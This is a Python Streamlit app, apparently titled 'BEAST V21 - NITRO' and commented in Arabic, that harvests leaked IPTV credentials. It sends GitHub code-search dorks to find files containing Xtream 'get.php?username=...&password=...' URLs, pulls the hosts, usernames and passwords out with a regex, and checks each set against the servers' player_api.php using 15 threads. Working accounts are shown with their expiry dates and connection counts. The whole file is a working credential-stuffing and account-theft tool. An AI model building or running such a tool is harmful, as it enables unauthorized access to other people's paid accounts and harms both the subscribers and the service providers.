import streamlit as st
import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =================================================
# 1. الدخول والتنسيق
# =================================================
if "auth" not in st.session_state: st.session_state.auth = False

def login():
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V21 - NITRO</h1>", unsafe_allow_html=True)
    p = st.text_input("Password:", type="password")
    if st.button("تنشيط"):
        if p == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()

if not st.session_state.auth: login(); st.stop()

st.set_page_config(page_title="Nitro Beast V21", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #050505; }
    .live-log { color: #00d4ff; font-family: monospace; font-size: 12px; background: #000; padding: 5px; border: 1px solid #111; }
    .active-card {
        background: #0d1117; border-left: 8px solid #00ff41;
        padding: 15px; margin-bottom: 8px; border-radius: 5px;
        border: 1px solid #30363d;
    }
    .val { color: #00ff41; font-family: monospace; }
    .label { color: #fbbf24; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

# إدارة الذاكرة
if 'hits' not in st.session_state: st.session_state.hits = []
if 'hunting' not in st.session_state: st.session_state.hunting = False
if 'stats' not in st.session_state: st.session_state.stats = {"checked": 0, "found": 0}

# =================================================
# 2. محرك الفحص السريع (Multi-Threading)
# =================================================
def fast_check(m):
    host, user, pw = m[0], m[1], m[2]
    try:
        url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(url, timeout=3).json()
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            return {"h": host, "u": user, "p": pw, "exp": exp, "con": f"{info.get('active_cons', '0')}/{info.get('max_connections', '1')}"}
    except: pass
    return None

# =================================================
# 3. التحكم والعدادات
# =================================================
with st.sidebar:
    st.header("⚡ BEAST NITRO")
    token = st.text_input("GitHub Token:", type="password")
    
    if st.button("🚀 بدء الصيد المليوني"):
        st.session_state.hunting = True
        st.rerun()
    if st.button("🛑 إيقاف"):
        st.session_state.hunting = False
        st.rerun()

    st.divider()
    st.metric("💎 شغال", st.session_state.stats["found"])
    st.metric("🔍 فحص", st.session_state.stats["checked"])

# =================================================
# 4. العرض المباشر (الرادار والنتائج)
# =================================================
log_placeholder = st.empty() # رادار الفحص السريع
st.markdown("---")
hits_container = st.container() # حاوية السيرفرات الشغالة

# عرض الصيد الحالي
with hits_container:
    for h in st.session_state.hits:
        st.markdown(f"""
        <div class="active-card">
            <span style="color:#00ff41; font-weight:bold;">✅ SERVER ACTIVE</span><br>
            <span class="label">Host:</span> <span class="val">{h['h']}</span><br>
            <span class="label">User:</span> <span class="val">{h['u']}</span> | <span class="label">Pass:</span> <span class="val">{h['p']}</span><br>
            <span class="label">Expiry:</span> <span style="color:#ff7b72;">{h['exp']}</span> | <span class="label">Conn:</span> <span class="val">{h['con']}</span>
        </div>
        """, unsafe_allow_html=True)

# تشغيل الهجوم
if st.session_state.hunting:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'xtream iptv 2026',
        '"http://" "user" "pass" "port" extension:txt'
    ]

    while st.session_state.hunting:
        for dork in dorks:
            if not st.session_state.hunting: break
            for page in range(1, 100): # مسح 100 صفحة
                if not st.session_state.hunting: break
                
                try:
                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    res = requests.get(url, headers=headers).json()
                    
                    if "items" not in res:
                        log_placeholder.warning("⏳ GitHub Rate Limit.. Waiting 20s")
                        time.sleep(20); continue

                    for item in res['items']:
                        raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        try:
                            content = requests.get(raw, timeout=3).text
                            matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                            
                            if matches:
                                # استخدام فحص متعدد الخيوط للسرعة القصوى
                                with ThreadPoolExecutor(max_workers=15) as executor:
                                    results = list(executor.map(fast_check, matches))
                                    
                                    for idx, r in enumerate(results):
                                        st.session_state.stats["checked"] += 1
                                        # عرض السيرفر الذي يتم فحص حالياً في الرادار
                                        log_placeholder.markdown(f"<div class='live-log'>⚡ Scanning: {matches[idx][0]}</div>", unsafe_allow_html=True)
                                        
                                        if r:
                                            st.session_state.hits.insert(0, r)
                                            st.session_state.stats["found"] += 1
                                            st.rerun() # تحديث فوري عند الصيد
                        except: continue
                except: continue
